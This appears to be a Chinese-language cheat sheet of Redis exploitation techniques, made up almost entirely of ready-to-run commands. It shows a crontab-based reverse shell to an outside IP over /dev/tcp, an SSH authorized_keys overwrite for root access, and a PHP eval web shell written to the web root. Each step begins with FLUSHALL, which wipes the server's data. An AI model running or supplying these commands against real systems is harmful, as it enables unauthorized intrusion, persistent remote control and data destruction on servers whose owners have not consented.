# [Redis常见利用方法](https://mp.weixin.qq.com/s/qQkiGO5wPs8no_BoK13tig)
## 反弹shell只能在Centos上使用，Ubuntu上是行不通的，原因如下:
## 因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件/var/spool/cron/crontabs/<username>权限必须是600也就是-rw———-才会执行，否则会报错(root) INSECURE MODE (mode 0600 expected)，
## 而Centos的定时任务文件/var/spool/cron/<username>权限644也能执行
## 用户可能就叫redis

# redis-cli.exe -h xx -p 63300
## FLUSHALL 清空旧的key值防止追加写入
##Ubuntu# config set dir /var/spool/cron/crontabs
##CentOS# config set dir /var/spool/cron/root
.\redis-cli.exe -h 192.168.127.131
FLUSHALL
set x "\n* * * * * /bin/bash -i > /dev/tcp/192.168.50.161/5555 0<&1 2>&1\n"
config set dir /var/spool/cron
config set dbfilename root
save


# 2. root身份 可写入 ssh
ssh-keygen -t rsa # 先生成 id_rsa.pub

## config set dir /home/redis/.ssh/ 
config set dir /root/.ssh/
config set dbfilename authorized_keys
set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDNexxxxxxxxxxx \n\n\n"
save
### 一定要加 username
ssh root@192.168.127.141


# 2.2 写入 ssh
redis > FLUSHALL
sh$ (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > key.txt
sh$ cat key.txt | redis-cli -h 192.168.127.141 -x set crackit
redis-cli -h 192.168.127.141
## config set dir /home/redis/.ssh/ 
config set dir /root/.ssh/ 
config set dbfilename authorized_keys
save


# 3. 写webshell
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php @eval($_POST['cmd']);?>"
save
